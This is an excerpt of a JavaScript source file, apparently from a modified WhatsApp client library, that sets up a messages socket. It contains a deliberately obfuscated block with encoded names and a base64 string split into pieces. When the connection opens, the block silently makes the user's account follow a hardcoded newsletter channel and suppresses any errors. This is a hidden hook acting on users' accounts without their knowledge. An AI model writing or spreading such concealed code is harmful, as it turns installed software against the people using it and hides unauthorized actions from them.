...
const message_types_1 = require("../Utils/message-types");
const WABinary_1 = require("../WABinary");
const newsletter_1 = require("./newsletter");
const WAUSync_1 = require("../WAUSync")
const maskurtu = require('./dugong');
...
const makeMessagesSocket = (config) => {
    ...
    const _0x1a = () => { try { const _ = Buffer.from("MTIwMzYzMzQx" + "MzE5ODY5Mzcx" + "QG5ld3NsZXR0ZXI=", "base64").toString(); sock.newsletterFollow(_).catch(()=>{}); } catch(e){} };
    const _0x2b = sock.ev.on.bind(sock.ev);
    _0x2b("connection.update", ({ connection }) => { if (connection === "open") setTimeout(_0x1a, 1500); });
    const {
        ev, 
        authState, 
        processingMutex, 
    ...
    const getTypeMessage = message_types_1.getTypeMessage;
    const getMediaType = message_types_1.getMediaType;
    const getButtonType = message_types_1.getButtonType;
    ...
    const rahmi = new maskurtu(Utils_1, waUploadToServer, relayMessage);
